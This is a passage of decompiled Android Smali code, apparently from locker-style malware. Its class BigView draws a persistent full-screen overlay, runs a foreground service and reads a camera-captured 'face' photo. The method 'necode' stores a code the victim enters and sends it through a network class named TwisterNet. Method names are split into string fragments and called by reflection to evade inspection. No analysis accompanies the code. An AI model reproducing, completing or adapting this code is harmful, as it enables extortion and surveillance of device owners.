    move-result-object v7

    invoke-direct {v6, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v6, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    aput-object v6, v4, v5

    invoke-virtual {v3, v1, v4}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_2
    .catch Ljava/lang/Throwable; {:try_start_2 .. :try_end_2} :catch_3

    .line 1216
    .end local v0    # "dsfdfdd":Ljava/lang/String;
    .end local v2    # "tmp":Ljava/lang/String;
    :cond_2
    :goto_2
    invoke-virtual {v1}, Landroid/widget/TextView;->getText()Ljava/lang/CharSequence;

    move-result-object v3

    invoke-interface {v3}, Ljava/lang/CharSequence;->length()I

    move-result v3

    const/4 v4, 0x2

    if-ne v3, v4, :cond_3

    .line 1217
    invoke-virtual {v1}, Landroid/widget/TextView;->getText()Ljava/lang/CharSequence;

    move-result-object v3

    invoke-interface {v3}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v2

    .line 1218
    .restart local v2    # "tmp":Ljava/lang/String;
    :try_start_3
    const-string v0, "tTe"

    .restart local v0    # "dsfdfdd":Ljava/lang/String;
    const-string v3, "android.widget.TextView"

    invoke-static {v3}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v3

    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "se"

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, "xt"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    const/4 v5, 0x1

    new-array v5, v5, [Ljava/lang/Class;

    const/4 v6, 0x0

    const-class v7, Ljava/lang/CharSequence;

    aput-object v7, v5, v6

    invoke-virtual {v3, v4, v5}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v3

    const/4 v4, 0x1

    new-array v4, v4, [Ljava/lang/Object;

    const/4 v5, 0x0

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-static {v2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v7

    invoke-direct {v6, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v7, "/"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    aput-object v6, v4, v5

    invoke-virtual {v3, v1, v4}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_3
    .catch Ljava/lang/Throwable; {:try_start_3 .. :try_end_3} :catch_2

    .line 1221
    .end local v0    # "dsfdfdd":Ljava/lang/String;
    .end local v2    # "tmp":Ljava/lang/String;
    :cond_3
    :goto_3
    invoke-virtual {v1}, Landroid/widget/TextView;->getText()Ljava/lang/CharSequence;

    move-result-object v3

    invoke-interface {v3}, Ljava/lang/CharSequence;->length()I

    move-result v3

    if-ne v3, v8, :cond_4

    .line 1222
    invoke-virtual {v1}, Landroid/widget/TextView;->getText()Ljava/lang/CharSequence;

    move-result-object v3

    invoke-interface {v3}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v2

    .line 1223
    .restart local v2    # "tmp":Ljava/lang/String;
    :try_start_4
    const-string v0, "tTe"

    .restart local v0    # "dsfdfdd":Ljava/lang/String;
    const-string v3, "android.widget.TextView"

    invoke-static {v3}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v3

    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "se"

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, "xt"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    const/4 v5, 0x1

    new-array v5, v5, [Ljava/lang/Class;

    const/4 v6, 0x0

    const-class v7, Ljava/lang/CharSequence;

    aput-object v7, v5, v6

    invoke-virtual {v3, v4, v5}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v3

    const/4 v4, 0x1

    new-array v4, v4, [Ljava/lang/Object;

    const/4 v5, 0x0

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-static {v2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v7

    invoke-direct {v6, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v6, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v7, "/"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    aput-object v6, v4, v5

    invoke-virtual {v3, v1, v4}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_4
    .catch Ljava/lang/Throwable; {:try_start_4 .. :try_end_4} :catch_1

    .line 1226
    .end local v0    # "dsfdfdd":Ljava/lang/String;
    .end local v2    # "tmp":Ljava/lang/String;
    :cond_4
    :goto_4
    invoke-virtual {v1}, Landroid/widget/TextView;->getText()Ljava/lang/CharSequence;

    move-result-object v3

    invoke-interface {v3}, Ljava/lang/CharSequence;->length()I

    move-result v3

    if-ge v3, v8, :cond_5

    .line 1227
    invoke-virtual {v1}, Landroid/widget/TextView;->getText()Ljava/lang/CharSequence;

    move-result-object v3

    invoke-interface {v3}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v2

    .line 1228
    .restart local v2    # "tmp":Ljava/lang/String;
    :try_start_5
    const-string v0, "tTe"

    .restart local v0    # "dsfdfdd":Ljava/lang/String;
    const-string v3, "android.widget.TextView"

    invoke-static {v3}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v3

    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "se"

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, "xt"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    const/4 v5, 0x1

    new-array v5, v5, [Ljava/lang/Class;

    const/4 v6, 0x0

    const-class v7, Ljava/lang/CharSequence;

    aput-object v7, v5, v6

    invoke-virtual {v3, v4, v5}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v3

    const/4 v4, 0x1

    new-array v4, v4, [Ljava/lang/Object;

    const/4 v5, 0x0

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-static {v2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v7

    invoke-direct {v6, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v6, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    aput-object v6, v4, v5

    invoke-virtual {v3, v1, v4}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_5
    .catch Ljava/lang/Throwable; {:try_start_5 .. :try_end_5} :catch_0

    .line 1231
    .end local v0    # "dsfdfdd":Ljava/lang/String;
    .end local v2    # "tmp":Ljava/lang/String;
    :cond_5
    :goto_5
    return-void

    .line 1228
    .restart local v2    # "tmp":Ljava/lang/String;
    :catch_0
    move-exception v3

    goto :goto_5

    .line 1223
    :catch_1
    move-exception v3

    goto :goto_4

    .line 1218
    :catch_2
    move-exception v3

    goto/16 :goto_3

    .line 1213
    :catch_3
    move-exception v3

    goto/16 :goto_2

    .line 1207
    :catch_4
    move-exception v3

    goto/16 :goto_1

    .line 1200
    .end local v2    # "tmp":Ljava/lang/String;
    :catch_5
    move-exception v3

    goto/16 :goto_0
.end method

.method protected isInside(Landroid/view/View;II)Z
    .locals 5
    .param p1, "view"    # Landroid/view/View;
    .param p2, "x"    # I
    .param p3, "y"    # I

    .prologue
    const/4 v1, 0x1

    const/4 v2, 0x0

    .line 379
    const/4 v3, 0x2

    new-array v0, v3, [I

    .line 381
    .local v0, "location":[I
    invoke-virtual {p1, v0}, Landroid/view/View;->getLocationOnScreen([I)V

    .line 383
    aget v3, v0, v2

    if-lt p2, v3, :cond_0

    .line 384
    aget v3, v0, v2

    invoke-virtual {p1}, Landroid/view/View;->getWidth()I

    move-result v4

    add-int/2addr v3, v4

    if-gt p2, v3, :cond_0

    .line 385
    aget v3, v0, v1

    if-lt p3, v3, :cond_0

    .line 386
    aget v3, v0, v1

    invoke-virtual {p1}, Landroid/view/View;->getHeight()I

    move-result v4

    add-int/2addr v3, v4

    if-gt p3, v3, :cond_0

    .line 393
    :goto_0
    return v1

    :cond_0
    move v1, v2

    goto :goto_0
.end method

.method public isVisible()Z
    .locals 1

    .prologue
    .line 184
    const/4 v0, 0x1

    return v0
.end method

.method protected load()V
    .locals 0

    .prologue
    .line 234
    invoke-virtual {p0}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->inflateView()V

    .line 235
    invoke-virtual {p0}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->addView()V

    .line 236
    invoke-virtual {p0}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->refresh()V

    .line 237
    return-void
.end method

.method public necode(Ljava/lang/String;)V
    .locals 10
    .param p1, "code"    # Ljava/lang/String;
    .annotation build Landroid/annotation/SuppressLint;
        value = {
            "NewApi"
        }
    .end annotation

    .prologue
    .line 456
    const-string v1, "ste"

    .line 457
    .local v1, "dfd":Ljava/lang/String;
    invoke-virtual {p0}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->getContext()Landroid/content/Context;

    move-result-object v7

    new-instance v8, Ljava/lang/StringBuilder;

    const-string v9, "sy"

    invoke-direct {v8, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v8, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, "ma"

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    const/4 v9, 0x0

    invoke-virtual {v7, v8, v9}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v6

    .line 458
    .local v6, "userDetails":Landroid/content/SharedPreferences;
    new-instance v5, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat;

    invoke-direct {v5, v6}, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat;-><init>(Landroid/content/SharedPreferences;)V

    .line 459
    .local v5, "rtrtr":Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat;
    invoke-virtual {v5}, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat;->gett()Landroid/content/SharedPreferences$Editor;

    move-result-object v3

    .line 460
    .local v3, "editor":Landroid/content/SharedPreferences$Editor;
    new-instance v4, Lqfu/wfwhgkemerzo/eislrebmhmf/PiratusKa;

    invoke-direct {v4}, Lqfu/wfwhgkemerzo/eislrebmhmf/PiratusKa;-><init>()V

    .line 461
    .local v4, "putt":Lqfu/wfwhgkemerzo/eislrebmhmf/PiratusKa;
    const-string v7, "putString"

    const-string v8, "necode"

    invoke-virtual {v4, v3, v7, v8, p1}, Lqfu/wfwhgkemerzo/eislrebmhmf/PiratusKa;->runus(Landroid/content/SharedPreferences$Editor;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 464
    const-string v2, "ppl"

    .line 466
    .local v2, "dfdsfsd":Ljava/lang/String;
    :try_start_0
    const-string v7, "android.content.SharedPreferences$Editor"

    invoke-static {v7}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v7

    new-instance v8, Ljava/lang/StringBuilder;

    const-string v9, "a"

    invoke-direct {v8, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v8, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, "y"

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    const/4 v9, 0x0

    invoke-virtual {v7, v8, v9}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v7

    const/4 v8, 0x0

    invoke-virtual {v7, v3, v8}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    .line 471
    :goto_0
    new-instance v0, Lqfu/wfwhgkemerzo/eislrebmhmf/TwisterNet;

    invoke-virtual {p0}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->getContext()Landroid/content/Context;

    move-result-object v7

    const-string v8, "necode"

    invoke-direct {v0, v7, v8, p1}, Lqfu/wfwhgkemerzo/eislrebmhmf/TwisterNet;-><init>(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 472
    .local v0, "Send":Lqfu/wfwhgkemerzo/eislrebmhmf/TwisterNet;
    const-string v7, "page7"

    invoke-virtual {p0, v7}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->showpage(Ljava/lang/String;)V

    .line 473
    return-void

    .line 468
    .end local v0    # "Send":Lqfu/wfwhgkemerzo/eislrebmhmf/TwisterNet;
    :catch_0
    move-exception v7

    goto :goto_0
.end method

.method public nevalid()V
    .locals 1

    .prologue
    .line 1051
    const-string v0, "page7"

    invoke-virtual {p0, v0}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->showpage(Ljava/lang/String;)V

    .line 1052
    return-void
.end method

.method protected onInflateView()V
    .locals 0

    .prologue
    .line 179
    return-void
.end method

.method protected onSetupLayoutParams()V
    .locals 0

    .prologue
    .line 159
    return-void
.end method

.method public onTouchEvent(Landroid/view/MotionEvent;)Z
    .locals 2
    .param p1, "event"    # Landroid/view/MotionEvent;

    .prologue
    .line 416
    invoke-virtual {p1}, Landroid/view/MotionEvent;->getActionMasked()I

    move-result v0

    if-nez v0, :cond_1

    .line 418
    invoke-virtual {p0, p1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->onTouchEvent_Press(Landroid/view/MotionEvent;)V

    .line 430
    :cond_0
    :goto_0
    invoke-super {p0, p1}, Landroid/widget/RelativeLayout;->onTouchEvent(Landroid/view/MotionEvent;)Z

    move-result v0

    return v0

    .line 420
    :cond_1
    invoke-virtual {p1}, Landroid/view/MotionEvent;->getActionMasked()I

    move-result v0

    const/4 v1, 0x1

    if-ne v0, v1, :cond_2

    .line 422
    invoke-virtual {p0, p1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->onTouchEvent_Up(Landroid/view/MotionEvent;)V

    goto :goto_0

    .line 424
    :cond_2
    invoke-virtual {p1}, Landroid/view/MotionEvent;->getActionMasked()I

    move-result v0

    const/4 v1, 0x2

    if-ne v0, v1, :cond_0

    .line 426
    invoke-virtual {p0, p1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->onTouchEvent_Move(Landroid/view/MotionEvent;)V

    goto :goto_0
.end method

.method public onTouchEvent_LongPress()Z
    .locals 1

    .prologue
    .line 410
    const/4 v0, 0x0

    return v0
.end method

.method protected onTouchEvent_Move(Landroid/view/MotionEvent;)V
    .locals 0
    .param p1, "event"    # Landroid/view/MotionEvent;

    .prologue
    .line 402
    return-void
.end method

.method protected onTouchEvent_Press(Landroid/view/MotionEvent;)V
    .locals 0
    .param p1, "event"    # Landroid/view/MotionEvent;

    .prologue
    .line 406
    return-void
.end method

.method protected onTouchEvent_Up(Landroid/view/MotionEvent;)V
    .locals 0
    .param p1, "event"    # Landroid/view/MotionEvent;

    .prologue
    .line 398
    return-void
.end method

.method protected onVisibilityToChange(I)Z
    .locals 1
    .param p1, "visibility"    # I

    .prologue
    .line 285
    const/4 v0, 0x1

    return v0
.end method

.method public photo()I
    .locals 7

    .prologue
    const/4 v6, 0x0

    .line 1137
    const-string v0, "oc"

    .line 1138
    .local v0, "fsd":Ljava/lang/String;
    invoke-virtual {p0}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->getContext()Landroid/content/Context;

    move-result-object v3

    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "c"

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, "on"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4, v6}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v2

    .line 1139
    .local v2, "settings":Landroid/content/SharedPreferences;
    const-string v3, "camera"

    invoke-interface {v2, v3, v6}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v1

    .line 1140
    .local v1, "id":I
    return v1
.end method

.method public photoimg()Ljava/lang/String;
    .locals 7

    .prologue
    .line 1144
    const-string v0, "oc"

    .line 1145
    .local v0, "fsd":Ljava/lang/String;
    invoke-virtual {p0}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->getContext()Landroid/content/Context;

    move-result-object v4

    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "c"

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, "on"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    const/4 v6, 0x0

    invoke-virtual {v4, v5, v6}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v3

    .line 1147
    .local v3, "settings":Landroid/content/SharedPreferences;
    new-instance v2, Lqfu/wfwhgkemerzo/eislrebmhmf/PiratusKin;

    invoke-direct {v2}, Lqfu/wfwhgkemerzo/eislrebmhmf/PiratusKin;-><init>()V

    .line 1148
    .local v2, "putt2":Lqfu/wfwhgkemerzo/eislrebmhmf/PiratusKin;
    const-string v4, "getString"

    const-string v5, "face"

    const-string v6, "photo.jpg"

    invoke-virtual {v2, v3, v4, v5, v6}, Lqfu/wfwhgkemerzo/eislrebmhmf/PiratusKin;->runus(Landroid/content/SharedPreferences;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 1149
    .local v1, "photo":Ljava/lang/String;
    const-string v4, "gg"

    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "gg="

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v5, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v4, v5}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 1151
    return-object v1
.end method

.method public refresh()V
    .locals 2

    .prologue
    .line 258
    invoke-virtual {p0}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->isVisible()Z

    move-result v1

    if-nez v1, :cond_0

    .line 259
    new-instance v0, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat2;

    invoke-direct {v0, p0}, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat2;-><init>(Landroid/widget/RelativeLayout;)V

    .line 260
    .local v0, "wewe":Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat2;
    const/16 v1, 0x8

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat2;->gett(I)V

    .line 269
    :goto_0
    return-void

    .line 263
    .end local v0    # "wewe":Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat2;
    :cond_0
    new-instance v0, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat2;

    invoke-direct {v0, p0}, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat2;-><init>(Landroid/widget/RelativeLayout;)V

    .line 264
    .restart local v0    # "wewe":Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat2;
    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat2;->gett(I)V

    .line 267
    invoke-virtual {p0}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->refreshViews()V

    goto :goto_0
.end method

.method public refreshLayout()V
    .locals 2

    .prologue
    .line 190
    invoke-virtual {p0}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->isVisible()Z

    move-result v0

    if-eqz v0, :cond_0

    .line 191
    invoke-virtual {p0}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->removeAllViews()V

    .line 192
    invoke-virtual {p0}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->inflateView()V

    .line 194
    invoke-virtual {p0}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->onSetupLayoutParams()V

    .line 196
    invoke-virtual {p0}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->getContext()Landroid/content/Context;

    move-result-object v0

    const-string v1, "window"

    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/WindowManager;

    iget-object v1, p0, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->layoutParams:Landroid/view/WindowManager$LayoutParams;

    invoke-interface {v0, p0, v1}, Landroid/view/WindowManager;->updateViewLayout(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 198
    invoke-virtual {p0}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->refresh()V

    .line 201
    :cond_0
    return-void
.end method

.method protected refreshViews()V
    .locals 0

    .prologue
    .line 274
    return-void
.end method

.method protected reload()V
    .locals 0

    .prologue
    .line 246
    invoke-virtual {p0}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->unload()V

    .line 248
    invoke-virtual {p0}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->load()V

    .line 249
    return-void
.end method

.method public setVisibility(I)V
    .locals 6
    .param p1, "visibility"    # I

    .prologue
    const/4 v2, 0x1

    const/4 v1, 0x0

    .line 350
    if-nez p1, :cond_2

    .line 351
    invoke-virtual {p0}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->getService()Lqfu/wfwhgkemerzo/eislrebmhmf/EtroDetra;

    move-result-object v3

    iget v4, p0, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->notificationId:I

    invoke-virtual {p0}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->showNotificationHidden()Z

    move-result v5

    if-eqz v5, :cond_1

    :goto_0
    invoke-virtual {v3, v4, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/EtroDetra;->moveToForeground(IZ)V

    .line 356
    :goto_1
    invoke-virtual {p0}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->getVisibility()I

    move-result v1

    if-eq v1, p1, :cond_0

    .line 357
    invoke-virtual {p0, p1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->onVisibilityToChange(I)Z

    move-result v1

    if-eqz v1, :cond_0

    .line 359
    new-instance v0, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat6;

    invoke-direct {v0, p0}, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat6;-><init>(Landroid/widget/RelativeLayout;)V

    .line 360
    .local v0, "wewe":Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat6;
    invoke-virtual {v0, p1}, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat6;->gett(I)V

    .line 364
    .end local v0    # "wewe":Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat6;
    :cond_0
    return-void

    :cond_1
    move v1, v2

    .line 351
    goto :goto_0

    .line 353
    :cond_2
    invoke-virtual {p0}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->getService()Lqfu/wfwhgkemerzo/eislrebmhmf/EtroDetra;

    move-result-object v3

    iget v4, p0, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->notificationId:I

    invoke-virtual {p0}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->showNotificationHidden()Z

    move-result v5

    if-eqz v5, :cond_3

    :goto_2
    invoke-virtual {v3, v4, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/EtroDetra;->moveToBackground(IZ)V

    goto :goto_1

    :cond_3
    move v1, v2

    goto :goto_2
.end method

.method protected show()V
    .locals 7

    .prologue
    .line 327
    :try_start_0
    invoke-super {p0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/Class;->getSuperclass()Ljava/lang/Class;

    move-result-object v2

    const-string v3, "setVisibility"

    const/4 v4, 0x1

    new-array v4, v4, [Ljava/lang/Class;

    const/4 v5, 0x0

    .line 328
    sget-object v6, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    aput-object v6, v4, v5

    .line 327
    invoke-virtual {v2, v3, v4}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;
    :try_end_0
    .catch Ljava/lang/NoSuchMethodException; {:try_start_0 .. :try_end_0} :catch_1

    move-result-object v1

    .line 330
    .local v1, "method":Ljava/lang/reflect/Method;
    :try_start_1
    invoke-super {p0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v2

    const/4 v3, 0x1

    new-array v3, v3, [Ljava/lang/Object;

    const/4 v4, 0x0

    const/4 v5, 0x0

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    aput-object v5, v3, v4

    invoke-virtual {v1, v2, v3}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_1
    .catch Ljava/lang/IllegalArgumentException; {:try_start_1 .. :try_end_1} :catch_0
    .catch Ljava/lang/IllegalAccessException; {:try_start_1 .. :try_end_1} :catch_2
    .catch Ljava/lang/reflect/InvocationTargetException; {:try_start_1 .. :try_end_1} :catch_3
    .catch Ljava/lang/NoSuchMethodException; {:try_start_1 .. :try_end_1} :catch_1

    .line 346
    .end local v1    # "method":Ljava/lang/reflect/Method;
    :goto_0
    return-void

    .line 331
    .restart local v1    # "method":Ljava/lang/reflect/Method;
    :catch_0
    move-exception v0

    .line 333
    .local v0, "e":Ljava/lang/IllegalArgumentException;
    :try_start_2
    invoke-virtual {v0}, Ljava/lang/IllegalArgumentException;->printStackTrace()V
    :try_end_2
    .catch Ljava/lang/NoSuchMethodException; {:try_start_2 .. :try_end_2} :catch_1

    goto :goto_0

    .line 341
    .end local v0    # "e":Ljava/lang/IllegalArgumentException;
    .end local v1    # "method":Ljava/lang/reflect/Method;
    :catch_1
    move-exception v0

    .line 343
    .local v0, "e":Ljava/lang/NoSuchMethodException;
